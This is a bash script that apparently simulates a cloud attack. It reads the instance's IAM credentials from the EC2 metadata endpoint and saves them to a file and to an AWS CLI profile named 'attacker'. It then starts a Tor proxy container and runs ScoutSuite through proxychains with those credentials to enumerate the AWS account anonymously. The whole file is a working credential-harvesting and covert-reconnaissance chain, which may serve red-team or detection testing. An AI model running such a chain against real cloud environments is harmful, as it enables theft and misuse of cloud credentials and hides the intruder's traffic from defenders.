#!/bin/bash

SCRIPTNAME=$(basename $0)
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done

# check for required aws cli
if ! command -v aws > /dev/null; then
    log "aws cli not found - installing..."
    sudo apt-get update && sudo apt-get install -y awscli
    log "done"
fi;

# build aws credentials file locally with ec2 crentials
log "Pulling ec2 instance credentials..."
INSTANCE_PROFILE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials)
AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)

# create an env file for scoutsuite
log "Building env file for scoutsuite..."
cat > .aws-ec2-instance <<-EOF
AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}
AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY}
AWS_SESSION_TOKEN=${AWS_SESSION_TOKEN}
AWS_DEFAULT_REGION=us-east-1
AWS_DEFAULT_OUTPUT=json
EOF

# update local aws config
log "Update local aws configuration adding ec2 instance as profile: attacker"
PROFILE="attacker"
aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID --profile=$PROFILE
aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY --profile=$PROFILE
aws configure set aws_session_token $AWS_SESSION_TOKEN --profile=$PROFILE

# reset docker containers
log "Stopping and removing any existing tor containers..."
docker stop torproxy > /dev/null 2>&1
docker rm torproxy > /dev/null 2>&1
docker stop proxychains-scoutsuite-aws > /dev/null 2>&1
docker rm proxychains-scoutsuite-aws > /dev/null 2>&1

# start tor proxy
log "Starting tor proxy..."
docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy

# build scoutsuite proxychains
TORPROXY=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' torproxy)
docker run --rm --name=proxychains-scoutsuite-aws --link torproxy:torproxy -e TORPROXY=$TORPROXY --env-file=.aws-ec2-instance ghcr.io/credibleforce/proxychains-scoutsuite-aws:main scout aws